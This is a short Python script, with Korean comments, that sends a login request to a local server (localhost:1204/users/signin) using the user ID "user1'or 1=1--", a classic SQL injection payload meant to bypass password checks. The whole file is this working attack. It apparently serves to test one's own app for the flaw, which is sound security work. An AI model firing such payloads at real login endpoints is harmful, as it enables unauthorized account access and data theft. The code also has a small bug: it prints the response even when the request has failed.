import requests
id = f"user1'or 1=1--"
# 서버 주소와 포트에 맞게 수정
url = 'http://localhost:1204/users/signin'
data = {
    'userId': id,
    'password': 'user1234'
}

try:
    response = requests.post(url, json=data)
except Exception as e:
    print('요청 중 오류 발생:', e)
print(response.text)
